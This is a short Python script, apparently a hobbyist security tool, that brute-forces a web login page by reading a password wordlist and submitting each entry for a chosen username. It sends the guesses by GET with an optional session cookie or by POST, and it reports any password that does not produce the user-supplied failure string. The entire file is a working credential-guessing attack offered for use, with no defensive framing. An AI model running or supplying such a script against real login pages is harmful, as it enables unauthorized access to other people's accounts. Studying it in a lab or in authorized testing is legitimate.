
import requests
from termcolor import colored

url = input('[+] Please enter the page universal resource locator(url): ')
username = input('[+] Please enter the username account to bruteforce: ')
password_file = input('[+] Please enter the password file to use: ')
login_failed_string = input('[+] Enter string that occurs when your login fails: ')
cookie_value = input('[+] Enter cookie value(Optional): ')

def cracking(username,url):
	for password in passwords:
		password = password.strip()
		print(colored(('Attempting: '+ password), 'red'))
		data = {'username':username, 'password':password,'Login':'submit'}
		if cookie_value !='':
			response = requests.get(url, params={'username':username, 'password':password,'Login':'Login'}, cookies = {'Cookie':cookie_value})
		else:	
			response = requests.post(url, data=data)
		if login_failed_string in response.content.decode():
			pass
		else:
			print(colored(('[+] Found a correspondent username:==> '+ username), 'green'))
			print(colored(('[+] Found a password:==> '+ password), 'green'))
			exit()

with open(password_file, 'r') as passwords:
	cracking(username,url)
print('[!_!] Password not enlisted')
